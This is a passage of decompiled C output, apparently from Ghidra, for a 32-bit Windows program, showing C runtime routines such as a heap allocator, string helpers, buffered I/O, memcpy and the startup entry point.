          if (((int)*(char *)(((int)(uVar4 + ((int)uVar4 >> 0x1f & 7U)) >> 3) + param_2) &
              1 << ((byte)uVar1 & 0x1f)) != 0) {
            *(char *)(uVar5 + param_1) = *(char *)(uVar5 + param_1) + (char)local_10;
          }
          local_10 = local_10 << 1;
          if (param_3 * 8 <= (int)(uVar4 + param_3)) {
            local_10 = 1;
          }
        }
        uVar4 = uVar5 + 1;
        uVar5 = uVar4;
      } while ((int)uVar4 < param_3);
    }
  }
  *(undefined *)(param_3 + param_1) = 0;
  return;
}



char * __cdecl FUN_00403780(char *param_1,char *param_2)

{
  char cVar1;
  char *pcVar2;
  
  for (pcVar2 = param_1; *pcVar2 != '\0'; pcVar2 = pcVar2 + 1) {
  }
  for (; cVar1 = *param_2, *pcVar2 = cVar1, cVar1 != '\0'; param_2 = param_2 + 1) {
    pcVar2 = pcVar2 + 1;
  }
  return param_1;
}



undefined4 __cdecl FUN_004037b0(int param_1)

{
  uint **ppuVar1;
  undefined4 uVar2;
  uint **ppuVar3;
  uint uVar4;
  int iVar5;
  uint **ppuVar6;
  uint uVar7;
  uint *puVar8;
  SIZE_T SVar9;
  uint **ppuVar10;
  
  iVar5 = (param_1 + 3U >> 0xe) + 1;
  uVar7 = iVar5 * 0x4000;
  SVar9 = iVar5 * 0x10000;
  ppuVar1 = (uint **)FUN_004048a0(SVar9);
  if (ppuVar1 == (uint **)0x0) {
    DAT_0040d280 = 0;
    uVar2 = 0;
  }
  else {
    if ((uint **)(DAT_0040e208 + (int)DAT_0040e204) == ppuVar1) {
      SVar9 = SVar9 + DAT_0040e208;
      uVar7 = SVar9 >> 2;
      ppuVar1 = DAT_0040e204;
    }
    DAT_0040e204 = ppuVar1 + uVar7;
    DAT_0040e208 = uVar7 * -4 + SVar9;
    if ((DAT_0040d0e4 + 1 == ppuVar1) && (DAT_0040d0ec != (uint **)0x0)) {
      ppuVar10 = ppuVar1 + -1;
      uVar4 = ((uint)*ppuVar10 & 0x7fffffff) + uVar7;
      *ppuVar10 = (uint *)(uVar7 | 0x80000000);
      DAT_0040d0e4 = DAT_0040d0e4 + uVar7;
      DAT_0040d0e4[-1] = *ppuVar10;
      *DAT_0040d0e4 = (uint *)(uVar4 | 0x80000000);
      DAT_0040d0e4[1 - uVar4] = (uint *)(uVar4 | 0x80000000);
      FUN_004040b0(ppuVar1);
      uVar2 = 1;
    }
    else {
      ppuVar10 = ppuVar1;
      *ppuVar1 = (uint *)DAT_0040d0ec;
      DAT_0040d0ec = ppuVar10;
      DAT_0040d0e4 = ppuVar1 + 1;
      if ((DAT_0040d0e8 == (uint **)0x0) || (DAT_0040d0e4 < DAT_0040d0e8)) {
        DAT_0040d0e8 = DAT_0040d0e4;
      }
      *DAT_0040d0e4 = (uint *)(uVar7 - 1 | 0x80000000);
      DAT_0040d0e4 = DAT_0040d0e4 + (uVar7 - 2);
      *DAT_0040d0e4 = (uint *)(uVar7 - 1 | 0x80000000);
      ppuVar10 = DAT_0040d0e4;
      puVar8 = (uint *)(uVar7 - 3);
      ppuVar1 = DAT_0040d0e4 + -1;
      if (DAT_0040d0fc < puVar8) {
        if (DAT_0040d104 < puVar8) {
          if (DAT_0040d108 < puVar8) {
            DAT_0040d114 = 7;
          }
          else {
            DAT_0040d114 = 6;
          }
        }
        else {
          DAT_0040d114 = ((puVar8 <= DAT_0040d100) - 1 & 1) + 4;
        }
      }
      else if (DAT_0040d0f4 < puVar8) {
        if (DAT_0040d0f8 < puVar8) {
          DAT_0040d114 = 3;
        }
        else {
          DAT_0040d114 = 2;
        }
      }
      else {
        DAT_0040d114 = (uint)(DAT_0040d0f0 < puVar8);
      }
      ppuVar3 = *(uint ***)(&DAT_0040d0c0 + DAT_0040d114 * 4);
      if (ppuVar3 == (uint **)0x0) {
        *(uint ***)(&DAT_0040d0c0 + DAT_0040d114 * 4) = ppuVar1;
        ppuVar3 = ppuVar1;
        ppuVar6 = ppuVar1;
        if ((int)DAT_0040d114 < (int)DAT_0040d110) {
          DAT_0040d110 = DAT_0040d114;
        }
      }
      else {
        ppuVar6 = (uint **)ppuVar3[-2];
      }
      ppuVar10[-2] = (uint *)ppuVar3;
      ppuVar3[-2] = (uint *)ppuVar1;
      ppuVar6[-1] = (uint *)ppuVar1;
      ppuVar10[-3] = (uint *)ppuVar6;
      ppuVar1[1 - (int)puVar8] = puVar8;
      *ppuVar1 = puVar8;
      *(uint ***)(&DAT_0040d0c0 + DAT_0040d114 * 4) = ppuVar1;
      for (; (*(int *)(&DAT_0040d0c0 + DAT_0040d110 * 4) == 0 && ((int)DAT_0040d110 < 7));
          DAT_0040d110 = DAT_0040d110 + 1) {
      }
      uVar2 = 1;
    }
  }
  return uVar2;
}



uint * __cdecl FUN_00403a00(int param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  uint *puVar7;
  uint *local_18;
  uint local_c;
  uint local_8;
  
  uVar6 = (param_1 + 3U >> 2) + 2;
  if (uVar6 < 4) {
    uVar6 = 4;
  }
  if (DAT_0040d0fc < uVar6) {
    if (DAT_0040d104 < uVar6) {
      if (DAT_0040d108 < uVar6) {
        uVar2 = 7;
      }
      else {
        uVar2 = 6;
      }
    }
    else {
      uVar2 = ((uVar6 <= DAT_0040d100) - 1 & 1) + 4;
    }
  }
  else if (DAT_0040d0f4 < uVar6) {
    if (DAT_0040d0f8 < uVar6) {
      uVar2 = 3;
    }
    else {
      uVar2 = 2;
    }
  }
  else {
    uVar2 = (uint)(DAT_0040d0f0 < uVar6);
  }
  puVar7 = (uint *)0x0;
  local_8 = 0;
  if ((int)uVar2 < (int)DAT_0040d110) {
    local_8 = 0;
    puVar7 = (uint *)0x0;
    uVar2 = DAT_0040d110;
  }
  do {
    do {
      if ((uVar6 <= local_8) || (7 < (int)uVar2)) {
        if (local_8 < uVar6) {
          iVar3 = FUN_004037b0(uVar6);
          if (iVar3 == 0) {
            return (uint *)0x0;
          }
          puVar7 = *(uint **)(&DAT_0040d0c0 + DAT_0040d114 * 4);
          local_8 = *puVar7;
          uVar2 = DAT_0040d114;
        }
        else if (0 < (int)uVar2) {
          uVar2 = uVar2 - 1;
        }
        uVar4 = local_8 - uVar6;
        if (uVar4 < 4) {
          puVar5 = (uint *)puVar7[-1];
          uVar6 = local_8;
          if (puVar7 == puVar5) {
            *(undefined4 *)(&DAT_0040d0c0 + uVar2 * 4) = 0;
            if (DAT_0040d110 == uVar2) {
              for (; (*(int *)(&DAT_0040d0c0 + DAT_0040d110 * 4) == 0 && ((int)DAT_0040d110 < 7));
                  DAT_0040d110 = DAT_0040d110 + 1) {
              }
            }
          }
          else {
            uVar4 = puVar7[-2];
            *(uint **)(uVar4 - 4) = puVar5;
            puVar5[-2] = uVar4;
            if (*(uint **)(&DAT_0040d0c0 + uVar2 * 4) == puVar7) {
              *(uint *)(&DAT_0040d0c0 + uVar2 * 4) = uVar4;
            }
          }
        }
        else {
          if (DAT_0040d0fc < uVar4) {
            if (DAT_0040d104 < uVar4) {
              if (DAT_0040d108 < uVar4) {
                local_c = 7;
              }
              else {
                local_c = 6;
              }
            }
            else {
              local_c = ((uVar4 <= DAT_0040d100) - 1 & 1) + 4;
            }
          }
          else if (DAT_0040d0f4 < uVar4) {
            if (DAT_0040d0f8 < uVar4) {
              local_c = 3;
            }
            else {
              local_c = 2;
            }
          }
          else {
            local_c = (uint)(DAT_0040d0f0 < uVar4);
          }
          if (local_c == uVar2) {
            puVar7[1 - uVar4] = uVar4;
            *puVar7 = uVar4;
          }
          else {
            puVar5 = (uint *)puVar7[-1];
            if (puVar7 == puVar5) {
              *(undefined4 *)(&DAT_0040d0c0 + uVar2 * 4) = 0;
              if (DAT_0040d110 == uVar2) {
                for (; (*(int *)(&DAT_0040d0c0 + DAT_0040d110 * 4) == 0 && ((int)DAT_0040d110 < 7));
                    DAT_0040d110 = DAT_0040d110 + 1) {
                }
              }
            }
            else {
              uVar1 = puVar7[-2];
              *(uint **)(uVar1 - 4) = puVar5;
              puVar5[-2] = uVar1;
              if (*(uint **)(&DAT_0040d0c0 + uVar2 * 4) == puVar7) {
                *(uint *)(&DAT_0040d0c0 + uVar2 * 4) = uVar1;
              }
            }
            puVar5 = *(uint **)(&DAT_0040d0c0 + local_c * 4);
            if (puVar5 == (uint *)0x0) {
              *(uint **)(&DAT_0040d0c0 + local_c * 4) = puVar7;
              puVar5 = puVar7;
              local_18 = puVar7;
              if ((int)local_c < (int)DAT_0040d110) {
                DAT_0040d110 = local_c;
              }
            }
            else {
              local_18 = (uint *)puVar5[-2];
            }
            puVar7[-1] = (uint)puVar5;
            puVar5[-2] = (uint)puVar7;
            local_18[-1] = (uint)puVar7;
            puVar7[-2] = (uint)local_18;
            puVar7[1 - uVar4] = uVar4;
            *puVar7 = uVar4;
          }
        }
        puVar7[uVar6 - local_8] = uVar6 | 0x80000000;
        puVar7[1 - local_8] = uVar6 | 0x80000000;
        return puVar7 + (2 - local_8);
      }
      uVar4 = uVar2 + 1;
      puVar7 = *(uint **)(&DAT_0040d0c0 + uVar2 * 4);
      uVar2 = uVar4;
    } while (puVar7 == (uint *)0x0);
    puVar5 = puVar7;
    if ((uint *)(DAT_0040d0e4 + -4) == puVar7) {
      puVar7 = (uint *)puVar7[-1];
      puVar5 = puVar7;
    }
    do {
      local_8 = *puVar7;
      if (uVar6 <= local_8) break;
      puVar7 = (uint *)puVar7[-1];
    } while (puVar7 != puVar5);
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint * __cdecl FUN_00403d00(uint param_1)

{
  uint *puVar1;
  
  puVar1 = (uint *)0x0;
  if (param_1 < DAT_0040d280) {
    puVar1 = FUN_00403a00(param_1);
  }
  if (puVar1 == (uint *)0x0) {
    puVar1 = (uint *)FUN_00404990(param_1);
  }
  if (puVar1 == (uint *)0x0) {
    _DAT_0040d334 = 0xc;
  }
  return puVar1;
}



void __cdecl FUN_00403d60(int param_1,byte *param_2)

{
  byte *pbVar1;
  
  pbVar1 = FUN_00404d10(&LAB_00403d40,param_1,param_2,(double *)&stack0x0000000c,0);
  if (-1 < (int)pbVar1) {
    pbVar1[param_1] = 0;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00403d90(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  uint *puVar5;
  uint uVar6;
  uint local_c;
  uint local_8;
  
  if ((*(uint *)(param_1 + -4) & 0x80000000) == 0) {
    _DAT_0040d334 = 0x16;
  }
  else {
    uVar2 = *(uint *)(param_1 + -4) & 0x7fffffff;
    puVar3 = (uint *)(param_1 + -8);
    puVar4 = (uint *)(param_1 + -8 + uVar2 * 4);
    local_8 = 0xffffffff;
    if ((puVar4[1] & 0x80000000) == 0) {
      puVar4 = puVar4 + puVar4[1];
      if (DAT_0040d0fc < *puVar4) {
        if (DAT_0040d104 < *puVar4) {
          if (DAT_0040d108 < *puVar4) {
            local_c = 7;
          }
          else {
            local_c = 6;
          }
        }
        else {
          local_c = ((*puVar4 <= DAT_0040d100) - 1 & 1) + 4;
        }
      }
      else if (DAT_0040d0f4 < *puVar4) {
        if (DAT_0040d0f8 < *puVar4) {
          local_c = 3;
        }
        else {
          local_c = 2;
        }
      }
      else {
        local_c = (uint)(DAT_0040d0f0 < *puVar4);
      }
      local_8 = local_c;
      uVar2 = uVar2 + *puVar4;
      *puVar4 = uVar2;
      puVar4[1 - uVar2] = uVar2;
    }
    if ((*puVar3 & 0x80000000) == 0) {
      uVar2 = uVar2 + *puVar3;
      if (DAT_0040d0fc < *puVar3) {
        if (DAT_0040d104 < *puVar3) {
          if (DAT_0040d108 < *puVar3) {
            uVar6 = 7;
          }
          else {
            uVar6 = 6;
          }
        }
        else {
          uVar6 = ((*puVar3 <= DAT_0040d100) - 1 & 1) + 4;
        }
      }
      else if (DAT_0040d0f4 < *puVar3) {
        if (DAT_0040d0f8 < *puVar3) {
          uVar6 = 3;
        }
        else {
          uVar6 = 2;
        }
      }
      else {
        uVar6 = (uint)(DAT_0040d0f0 < *puVar3);
      }
      puVar5 = *(uint **)(param_1 + -0xc);
      if (puVar3 == puVar5) {
        *(undefined4 *)(&DAT_0040d0c0 + uVar6 * 4) = 0;
        if (DAT_0040d110 == uVar6) {
          for (; (*(int *)(&DAT_0040d0c0 + DAT_0040d110 * 4) == 0 && ((int)DAT_0040d110 < 7));
              DAT_0040d110 = DAT_0040d110 + 1) {
          }
        }
      }
      else {
        uVar1 = *(uint *)(param_1 + -0x10);
        *(uint **)(uVar1 - 4) = puVar5;
        puVar5[-2] = uVar1;
        if (*(uint **)(&DAT_0040d0c0 + uVar6 * 4) == puVar3) {
          *(uint *)(&DAT_0040d0c0 + uVar6 * 4) = uVar1;
        }
      }
      *puVar4 = uVar2;
      puVar4[1 - uVar2] = uVar2;
    }
    if (DAT_0040d0fc < uVar2) {
      if (DAT_0040d104 < uVar2) {
        if (DAT_0040d108 < uVar2) {
          uVar6 = 7;
        }
        else {
          uVar6 = 6;
        }
      }
      else {
        uVar6 = ((uVar2 <= DAT_0040d100) - 1 & 1) + 4;
      }
    }
    else if (DAT_0040d0f4 < uVar2) {
      if (DAT_0040d0f8 < uVar2) {
        uVar6 = 3;
      }
      else {
        uVar6 = 2;
      }
    }
    else {
      uVar6 = (uint)(DAT_0040d0f0 < uVar2);
    }
    if (local_8 != uVar6) {
      if (-1 < (int)local_8) {
        puVar3 = (uint *)puVar4[-1];
        if (puVar4 == puVar3) {
          *(undefined4 *)(&DAT_0040d0c0 + local_8 * 4) = 0;
          if (DAT_0040d110 == local_8) {
            for (; (*(int *)(&DAT_0040d0c0 + DAT_0040d110 * 4) == 0 && ((int)DAT_0040d110 < 7));
                DAT_0040d110 = DAT_0040d110 + 1) {
            }
          }
        }
        else {
          uVar1 = puVar4[-2];
          *(uint **)(uVar1 - 4) = puVar3;
          puVar3[-2] = uVar1;
          if (*(uint **)(&DAT_0040d0c0 + local_8 * 4) == puVar4) {
            *(uint *)(&DAT_0040d0c0 + local_8 * 4) = uVar1;
          }
        }
      }
      puVar3 = *(uint **)(&DAT_0040d0c0 + uVar6 * 4);
      if (puVar3 == (uint *)0x0) {
        *(uint **)(&DAT_0040d0c0 + uVar6 * 4) = puVar4;
        puVar3 = puVar4;
        puVar5 = puVar4;
        if ((int)uVar6 < (int)DAT_0040d110) {
          DAT_0040d110 = uVar6;
        }
      }
      else {
        puVar5 = (uint *)puVar3[-2];
      }
      puVar4[-1] = (uint)puVar3;
      puVar3[-2] = (uint)puVar4;
      puVar5[-1] = (uint)puVar4;
      puVar4[-2] = (uint)puVar5;
      puVar4[1 - uVar2] = uVar2;
      *puVar4 = uVar2;
      DAT_0040d114 = uVar6;
      *(uint **)(&DAT_0040d0c0 + uVar6 * 4) = puVar4;
    }
  }
  return;
}



void __cdecl FUN_004040b0(LPVOID param_1)

{
  if (param_1 != (LPVOID)0x0) {
    if ((DAT_0040d0e8 < (int)param_1 - 4U) && ((int)param_1 - 4U < DAT_0040d0e4)) {
      FUN_00403d90((int)param_1);
    }
    else {
      FUN_004049d0(param_1);
    }
  }
  return;
}



void __cdecl FUN_004040f0(LPCSTR param_1,char *param_2)

{
  uint *puVar1;
  
  puVar1 = FUN_00404f90(0);
  FUN_00405010(param_1,param_2,puVar1,0xffffffff,'\0');
  return;
}



void __cdecl FUN_00404120(uint *param_1,uint param_2,DWORD param_3)

{
  FUN_00405150(param_1,(uint *)0x0,param_2,(int)param_2 >> 0x1f,param_3);
  return;
}



undefined8 __cdecl FUN_00404150(uint *param_1)

{
  undefined8 uVar1;
  
  uVar1 = FUN_00405330(param_1,(uint *)0x0);
  return uVar1;
}



void __cdecl FUN_00404160(uint *param_1)

{
  FUN_00405150(param_1,(uint *)0x0,0,0,0);
  *param_1 = *param_1 & 0xfffffdff;
  return;
}



uint __cdecl FUN_00404180(undefined8 *param_1,uint param_2,uint *param_3,uint *param_4)

{
  undefined *puVar1;
  int iVar2;
  uint *puVar3;
  uint *extraout_ECX;
  uint uVar4;
  uint local_10;
  undefined8 *local_8;
  
  local_8 = param_1;
  uVar4 = param_2 * (int)param_3;
  if (uVar4 == 0) {
    uVar4 = 0;
  }
  else if ((uint)(0xffffffff / ZEXT48(param_3)) < param_2) {
    uVar4 = 0;
  }
  else {
    puVar3 = param_3;
    if ((*(ushort *)param_4 & 0x4000) != 0) {
      while ((param_1 = local_8, uVar4 != 0 && ((uint *)param_4[7] < param_4 + 0x12))) {
        puVar1 = (undefined *)param_4[7];
        puVar3 = (uint *)(puVar1 + 1);
        param_4[7] = (uint)puVar3;
        *(undefined *)local_8 = *puVar1;
        uVar4 = uVar4 - 1;
        local_8 = (undefined8 *)((int)local_8 + 1);
      }
    }
    while (uVar4 != 0) {
      if (param_4[10] != 0) {
        param_4[5] = param_4[10];
        param_4[10] = 0;
      }
      if ((param_4[5] <= param_4[4]) && (puVar3 = param_4, iVar2 = FUN_00405460(param_4), iVar2 < 1)
         ) break;
      local_10 = param_4[5] - param_4[4];
      if (uVar4 < local_10) {
        local_10 = uVar4;
      }
      FUN_00404a40(puVar3,param_4[4],param_1,(undefined8 *)param_4[4],local_10);
      param_1 = (undefined8 *)(local_10 + (int)param_1);
      uVar4 = uVar4 - local_10;
      param_4[4] = local_10 + param_4[4];
      puVar3 = extraout_ECX;
    }
    uVar4 = (param_2 * (int)param_3 - uVar4) / param_2;
  }
  return uVar4;
}



void FUN_004042a0(void)

{
  if (DAT_0040d118 == 0) {
    DAT_0040d118 = 1;
    FUN_00405590(&LAB_00404280);
  }
  return;
}



undefined4 __cdecl FUN_004042c0(uint *param_1)

{
  undefined4 uVar1;
  int iVar2;
  
  uVar1 = FUN_004055c0(param_1);
  if ((*(byte *)param_1 & 0x40) != 0) {
    FUN_004040b0((LPVOID)param_1[2]);
  }
  param_1[2] = 0;
  if (-1 < (int)param_1[1]) {
    if ((*param_1 & 0x20000) == 0) {
      iVar2 = FUN_00405690(param_1[1]);
    }
    else {
      iVar2 = (*(code *)param_1[0x17])(param_1);
    }
    if (iVar2 != 0) {
      uVar1 = 0xffffffff;
    }
  }
  if ((LPCSTR)param_1[0xf] != (LPCSTR)0x0) {
    iVar2 = FUN_00405750((LPCSTR)param_1[0xf]);
    if (iVar2 != 0) {
      uVar1 = 0xffffffff;
    }
    FUN_004040b0((LPVOID)param_1[0xf]);
    param_1[0xf] = 0;
  }
  if ((*(byte *)param_1 & 0x80) == 0) {
    *param_1 = 0;
    param_1[1] = 0xffffffff;
    param_1[2] = (uint)(param_1 + 0x12);
    param_1[4] = (uint)(param_1 + 0x12);
    param_1[5] = (uint)(param_1 + 0x12);
    param_1[0xb] = (uint)(param_1 + 0x12);
    param_1[6] = (uint)(param_1 + 0x12);
    param_1[0xc] = (uint)(param_1 + 0x12);
    param_1[7] = (uint)(param_1 + 0x12);
    param_1[8] = (uint)(param_1 + 10);
  }
  else {
    iVar2 = 0;
    do {
      if ((uint *)(&PTR_DAT_0040d478)[iVar2] == param_1) {
        (&PTR_DAT_0040d478)[iVar2] = (undefined *)0x0;
        break;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 0x100);
    FUN_004040b0(param_1);
  }
  return uVar1;
}



char * __cdecl FUN_004043b0(char *param_1,uint param_2,uint param_3)

{
  if (param_3 <= param_2) {
    param_1 = FUN_004043b0(param_1,param_2 / param_3,param_3);
  }
  *param_1 = "0123456789abcdefghijklmnopqrstuvwxyz"[param_2 % param_3];
  return param_1 + 1;
}



char * __cdecl FUN_00404400(uint param_1,char *param_2,uint param_3)

{
  char *pcVar1;
  
  if ((param_3 == 10) && ((int)param_1 < 0)) {
    *param_2 = '-';
    pcVar1 = FUN_004043b0(param_2 + 1,-param_1,10);
    *pcVar1 = '\0';
  }
  else {
    pcVar1 = FUN_004043b0(param_2,param_1,param_3);
    *pcVar1 = '\0';
  }
  return param_2;
}



char * __cdecl FUN_004044c0(char *param_1,char *param_2,int param_3)

{
  char *pcVar1;
  
  pcVar1 = param_1;
  for (; (param_3 != 0 && (*param_2 != '\0')); param_2 = param_2 + 1) {
    *pcVar1 = *param_2;
    pcVar1 = pcVar1 + 1;
    param_3 = param_3 + -1;
  }
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *pcVar1 = '\0';
    pcVar1 = pcVar1 + 1;
  }
  return param_1;
}



uint * __cdecl FUN_00404500(undefined8 *param_1,uint param_2,uint *param_3,uint *param_4)

{
  int iVar1;
  uint *puVar2;
  uint *extraout_ECX;
  uint *puVar3;
  uint *extraout_ECX_00;
  uint *puVar4;
  uint *puVar5;
  uint *local_10;
  uint *local_c;
  
  puVar5 = (uint *)(param_2 * (int)param_3);
  if (puVar5 == (uint *)0x0) {
    param_3 = (uint *)0x0;
  }
  else if ((uint)(0xffffffff / ZEXT48(param_3)) < param_2) {
    param_3 = (uint *)0x0;
  }
  else {
    puVar3 = param_3;
    if (param_2 != 0) {
      do {
        if ((puVar5 == (uint *)0x0) ||
           ((param_4[6] <= param_4[4] &&
            (puVar3 = param_4, iVar1 = FUN_00405760(param_4), iVar1 < 0)))) break;
        if ((*(ushort *)param_4 & 0x400) == 0) {
          local_c = (uint *)0x0;
        }
        else {
          local_c = FUN_00405850((uint *)param_1,10,puVar5);
          puVar3 = extraout_ECX;
        }
        local_10 = puVar5;
        if (local_c != (uint *)0x0) {
          local_10 = (uint *)((int)local_c + (1 - (int)param_1));
        }
        puVar2 = (uint *)(param_4[6] - (int)(uint *)param_4[4]);
        puVar4 = (uint *)param_4[4];
        if (puVar2 < local_10) {
          local_c = (uint *)0x0;
          puVar4 = puVar2;
          local_10 = puVar2;
        }
        FUN_00404a40(puVar3,puVar4,(undefined8 *)param_4[4],param_1,(uint)local_10);
        param_1 = (undefined8 *)((int)local_10 + (int)param_1);
        puVar5 = (uint *)((int)puVar5 - (int)local_10);
        param_4[4] = (int)local_10 + param_4[4];
        puVar3 = extraout_ECX_00;
      } while ((local_c == (uint *)0x0) ||
              (puVar3 = param_4, iVar1 = FUN_004055c0(param_4), iVar1 == 0));
      if ((*(ushort *)param_4 & 0x800) != 0) {
        FUN_004055c0(param_4);
      }
      if ((*(ushort *)param_4 & 0xc00) != 0) {
        param_4[6] = param_4[4];
      }
      param_3 = (uint *)((param_2 * (int)param_3 - (int)puVar5) / param_2);
    }
  }
  return param_3;
}



void __cdecl FUN_00404660(int param_1,byte *param_2)

{
  FUN_00404d10(&LAB_00404630,param_1,param_2,(double *)&stack0x0000000c,0);
  return;
}



int __cdecl FUN_00404680(byte *param_1,byte *param_2)

{
  short sVar1;
  short sVar2;
  int iVar3;
  
  do {
    sVar1 = *(short *)(PTR_DAT_0040d878 + (uint)*param_1 * 2);
    param_1 = param_1 + 1;
    sVar2 = *(short *)(PTR_DAT_0040d878 + (uint)*param_2 * 2);
    param_2 = param_2 + 1;
    if (sVar1 == 0) break;
  } while (sVar1 == sVar2);
  if (sVar1 == sVar2) {
    iVar3 = 0;
  }
  else {
    iVar3 = ((sVar1 < sVar2) - 1 & 2) - 1;
  }
  return iVar3;
}



int __cdecl FUN_004046d0(byte *param_1,byte *param_2,int param_3)

{
  if (param_3 != 0) {
    do {
      if (*param_1 != *param_2) {
        return ((*param_1 < *param_2) - 1 & 2) - 1;
      }
      if (*param_1 == 0) {
        return 0;
      }
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_3 = param_3 + -1;
    } while (param_3 != 0);
  }
  return 0;
}



void __cdecl FUN_00404720(UINT param_1)

{
  int iVar1;
  
  if (DAT_0040d25c < 0x50) {
    do {
      iVar1 = DAT_0040d25c * 4;
      DAT_0040d25c = DAT_0040d25c + 1;
      (**(code **)(&DAT_0040d11c + iVar1))();
    } while (DAT_0040d25c < 0x50);
  }
  while (DAT_0040d260 != 0) {
    DAT_0040d260 = DAT_0040d260 + -1;
    (**(code **)(&DAT_0040d11c + DAT_0040d260 * 4))();
  }
  FUN_00405930(param_1);
  return;
}



void entry(void)

{
  int iVar1;
  UINT UVar2;
  code **ppcVar3;
  _STARTUPINFOA local_64;
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040b5e4;
  puStack_10 = &LAB_00405948;
  local_14 = ExceptionList;
  local_1c = &stack0xffffff90;
  ExceptionList = &local_14;
  DAT_0040d27c = FUN_00407c70(0x2000000);
  iVar1 = FUN_00404940();
  if (iVar1 == 0) {
    FUN_00405930(1);
  }
  local_8 = 0;
  FUN_00405be0();
  FUN_00405c50();
  FUN_00405ca0();
  FUN_00406080();
  FUN_00406120();
  for (ppcVar3 = (code **)&DAT_0040c4f8; ppcVar3 < &DAT_0040c4f8; ppcVar3 = ppcVar3 + 1) {
    (**ppcVar3)();
  }
  local_64.dwFlags = 0;
  GetStartupInfoA(&local_64);
  GetModuleHandleA((LPCSTR)0x0);
  FUN_004061e0();
  UVar2 = FUN_00402aa0();
  for (ppcVar3 = (code **)&DAT_0040c4f8; ppcVar3 < &DAT_0040c4f8; ppcVar3 = ppcVar3 + 1) {
    (**ppcVar3)();
  }
  FUN_00404720(UVar2);
  ExceptionList = local_14;
  return;
}



LPVOID __cdecl FUN_004048a0(SIZE_T param_1)

{
  LPVOID pvVar1;
  LPVOID lpAddress;
  _MEMORY_BASIC_INFORMATION local_20;
  
  if (((DAT_0040d278 != (LPCVOID)0x0) ||
      (DAT_0040d278 = VirtualAlloc((LPVOID)0x0,DAT_0040d27c,0x2000,1), pvVar1 = DAT_0040d278,
      DAT_0040d278 != (LPVOID)0x0)) &&
     (pvVar1 = (LPVOID)VirtualQuery(DAT_0040d278,&local_20,0x1c), pvVar1 != (LPVOID)0x0)) {
    lpAddress = DAT_0040d278;
    if (local_20.State == 0x1000) {
      lpAddress = (LPVOID)(local_20.RegionSize + (int)DAT_0040d278);
    }
    if (param_1 + (int)lpAddress < DAT_0040d27c + (int)DAT_0040d278) {
      pvVar1 = VirtualAlloc(lpAddress,param_1,0x1000,4);
      if (pvVar1 != (LPVOID)0x0) {
        pvVar1 = lpAddress;
      }
    }
    else {
      pvVar1 = (LPVOID)0x0;
    }
  }
  return pvVar1;
}



undefined4 FUN_00404940(void)

{
  DAT_0040e20c = HeapCreate(1,0x1000,0);
  if (DAT_0040e20c != (HANDLE)0x0) {
    return 1;
  }
  return 0;
}



void __cdecl FUN_00404990(SIZE_T param_1)

{
  HeapAlloc(DAT_0040e20c,1,param_1);
  return;
}



void __cdecl FUN_004049d0(LPVOID param_1)

{
  HeapFree(DAT_0040e20c,1,param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __fastcall
FUN_00404a40(undefined4 param_1,undefined4 param_2,undefined8 *param_3,undefined8 *param_4,
            uint param_5)

{
  undefined8 uVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  int iVar9;
  uint uVar10;
  undefined8 *puVar11;
  undefined8 *puVar12;
  undefined8 *puVar13;
  undefined8 *puVar14;
  undefined8 *puVar15;
  
  puVar14 = param_3;
  if ((_DAT_0040d88c & 2) == 0) {
    for (; param_5 != 0; param_5 = param_5 - 1) {
      *(undefined *)puVar14 = *(undefined *)param_4;
      param_4 = (undefined8 *)((int)param_4 + 1);
      puVar14 = (undefined8 *)((int)puVar14 + 1);
    }
    return CONCAT44(param_2,param_3);
  }
  if (0x3f < param_5) {
    if ((param_5 < 0x8001) || (0x10000 < param_5)) {
      uVar10 = 8U - (int)param_3 & 7;
      param_5 = param_5 - uVar10;
      puVar12 = param_4;
      puVar11 = param_4;
      puVar13 = param_3;
      switch(uVar10) {
      case 7:
        puVar14 = (undefined8 *)((int)param_3 + 1);
        puVar12 = (undefined8 *)((int)param_4 + 1);
        *(undefined *)param_3 = *(undefined *)param_4;
      case 6:
        puVar13 = (undefined8 *)((int)puVar14 + 1);
        puVar11 = (undefined8 *)((int)puVar12 + 1);
        *(undefined *)puVar14 = *(undefined *)puVar12;
      case 5:
        puVar14 = (undefined8 *)((int)puVar13 + 1);
        param_4 = (undefined8 *)((int)puVar11 + 1);
        *(undefined *)puVar13 = *(undefined *)puVar11;
      case 4:
        puVar13 = (undefined8 *)((int)puVar14 + 1);
        puVar12 = (undefined8 *)((int)param_4 + 1);
        *(undefined *)puVar14 = *(undefined *)param_4;
      case 3:
        puVar14 = (undefined8 *)((int)puVar13 + 1);
        param_4 = (undefined8 *)((int)puVar12 + 1);
        *(undefined *)puVar13 = *(undefined *)puVar12;
      case 2:
        puVar13 = (undefined8 *)((int)puVar14 + 1);
        puVar12 = (undefined8 *)((int)param_4 + 1);
        *(undefined *)puVar14 = *(undefined *)param_4;
      case 1:
        puVar14 = (undefined8 *)((int)puVar13 + 1);
        param_4 = (undefined8 *)((int)puVar12 + 1);
        *(undefined *)puVar13 = *(undefined *)puVar12;
      }
    }
    uVar10 = param_5 >> 6;
    if (uVar10 != 0) {
      if (uVar10 < 0x400) {
        do {
          uVar1 = param_4[1];
          *puVar14 = *param_4;
          puVar14[1] = uVar1;
          uVar1 = param_4[3];
          puVar14[2] = param_4[2];
          puVar14[3] = uVar1;
          uVar1 = param_4[5];
          puVar14[4] = param_4[4];
          puVar14[5] = uVar1;
          uVar1 = param_4[7];
          puVar14[6] = param_4[6];
          puVar14[7] = uVar1;
          param_4 = param_4 + 8;
          puVar14 = puVar14 + 8;
          uVar10 = uVar10 - 1;
        } while (uVar10 != 0);
      }
      else {
        if (0xc4f < uVar10) {
          for (; 0x7f < (int)uVar10; uVar10 = uVar10 - 0x80) {
